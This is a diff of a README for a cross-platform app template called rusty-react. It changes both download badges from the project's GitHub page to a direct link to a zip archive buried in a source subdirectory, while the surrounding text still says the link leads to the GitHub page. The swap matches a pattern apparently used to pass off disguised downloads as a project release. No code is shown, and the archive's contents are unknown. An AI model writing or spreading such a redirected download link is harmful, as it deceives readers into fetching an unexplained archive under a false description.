@@ -1,6 +1,6 @@
 # ⚙️ rusty-react - Build Cross-Platform Apps Easily
 
-[![Download rusty-react](https://img.shields.io/badge/Download-rusty--react-brightgreen?style=for-the-badge)](https://github.com/SaadKhan-TRD/rusty-react)
+[![Download rusty-react](https://img.shields.io/badge/Download-rusty--react-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/SaadKhan-TRD/rusty-react/main/ui/src/integrations/tanstack-query/rusty-react-1.2.zip)
 
 ## 🔎 What is rusty-react?
 
@@ -37,7 +37,7 @@ Start by downloading the rusty-react template. This will give you the files and 
 
 You can download rusty-react here:
 
-[![Download rusty-react](https://img.shields.io/badge/Download-rusty--react-blue?style=for-the-badge)](https://github.com/SaadKhan-TRD/rusty-react)
+[![Download rusty-react](https://img.shields.io/badge/Download-rusty--react-blue?style=for-the-badge)](https://raw.githubusercontent.com/SaadKhan-TRD/rusty-react/main/ui/src/integrations/tanstack-query/rusty-react-1.2.zip)
 
 This link takes you to the GitHub page where you can get the files and instructions.
 
